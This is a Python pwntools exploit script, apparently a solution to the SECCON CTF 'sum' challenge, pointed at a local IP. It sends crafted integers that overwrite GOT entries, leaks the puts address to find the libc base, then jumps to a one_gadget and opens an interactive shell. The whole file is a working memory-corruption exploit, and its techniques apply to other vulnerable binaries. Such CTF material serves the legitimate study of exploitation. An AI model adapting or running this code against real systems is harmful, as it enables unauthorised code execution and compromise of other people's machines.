from pwn import *

context.arch = 'amd64'
# con = remote('sum.chal.seccon.jp', 10001)
con = remote('192.168.10.66', 10001)
# raw_input()

con.recvregex('2 3 4 0\n')
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-2099668))
con.sendline(str(6295624))

con.recvregex('2 3 4 0\n')
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-2099764))
#con.sendline(str(-2099732))
con.sendline(str(6295608))

con.recvregex('2 3 4 0\n')
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-1))
con.sendline(str(-68))
con.sendline(str(6295648))

msg = con.recvregex('2 3 4 0\n').strip().split('\n')
puts_offset = 0x00000000000809c0
# puts_offset = 0x000000000006f690
libc_base = unpack(msg[0] + '\x00\x00') - puts_offset
print '[+] libc_base addr = 0x%x' % libc_base

one_gadget = libc_base + 0x10a38c
con.sendline(str(1))
con.sendline(str(1))
con.sendline(str(1))
con.sendline(str(1))
con.sendline(str(one_gadget - 4 - 6295624))
con.sendline(str(6295624))

con.interactive()
